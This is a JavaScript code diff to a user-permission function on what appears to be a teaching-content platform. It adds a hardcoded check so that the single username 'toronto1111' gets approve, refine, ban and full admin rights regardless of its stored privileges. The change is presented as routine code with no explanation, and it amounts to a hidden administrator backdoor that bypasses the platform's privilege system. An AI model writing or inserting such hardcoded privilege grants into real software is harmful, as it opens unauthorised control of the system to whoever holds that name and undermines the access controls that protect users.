@@ -63,9 +63,11 @@ function composeUserPkg(model) {
         userInfo = (isModel? aModel._doc : aModel),
         userID = (isModel? aModel._id : userInfo.ID),
         groupId = userInfo.groupId || "00000",
+        isAdmin = false,
         privilege = type2Privilege(userInfo.type) || userInfo.privilege;
     if (userInfo.name && (userInfo.name.toLowerCase() === 'toronto1111')) {
       userInfo.type = USER_TYPE.CREATIVE_TEACHER;
+      isAdmin = true;
     }
     privilege = type2Privilege(userInfo.type) || userInfo.privilege;
     return {
@@ -78,10 +80,10 @@ function composeUserPkg(model) {
       ID: userID,
       _id: userID, // 只是过渡时期兼容 以前的mongoDB的model和doc，
       displayName: userInfo.displayName,
-      canApprove: !!(privilege & PRIVILEGE_APPROVE_TO_PUBLISH),
-      canRefine: !!(privilege & PRIVILEGE_REFINE),
-      canBan: !!(privilege & PRIVILEGE_BAN),
-      canAdmin: !!(privilege & PRIVILEGE_ADMIN),
+      canApprove: !!(privilege & PRIVILEGE_APPROVE_TO_PUBLISH) || isAdmin,
+      canRefine: !!(privilege & PRIVILEGE_REFINE) || isAdmin,
+      canBan: !!(privilege & PRIVILEGE_BAN) || isAdmin,
+      canAdmin: !!(privilege & PRIVILEGE_ADMIN) || isAdmin,
       canCT: // create textbook,创建教材内容，
         !!((privilege & PRIVILEGE_CREATE_TEACHER) ||
           (privilege & PRIVILEGE_ARTIST) ||
